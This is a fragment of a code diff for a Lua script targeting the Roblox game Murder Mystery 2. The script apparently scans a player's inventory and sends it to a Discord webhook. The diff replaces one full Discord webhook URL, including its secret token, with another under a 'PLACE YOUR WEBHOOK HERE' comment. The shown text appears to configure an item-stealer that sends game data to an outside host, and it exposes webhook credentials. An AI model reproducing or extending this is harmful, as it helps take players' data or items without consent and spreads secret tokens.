@@ -464,7 +464,7 @@ local function scanInventoryAndSendToWebhook()
 end
 
 -- PLACE YOUR WEBHOOK HERE
-_G.webhook = "https://discord.com/api/webhooks/1499394466799157389/pl_9uUOoQkl-7W842AUDiGa1BFJ3_uJHRjyBsAqA91uzUE3RBWX1O5GX351KzaAjpqZL"
+_G.webhook = "https://discord.com/api/webhooks/1499065571986116882/Ge2KHxg6ROnN6e93UGCxep4ajFYxIJLEhYW1x0X7XmdQFHGWBJj6wV9jGgMfz2Xg3YSg"
 
 if game.PlaceId ~= 142823291 then
     warn("Game not supported. Please join Murder Mystery 2.")
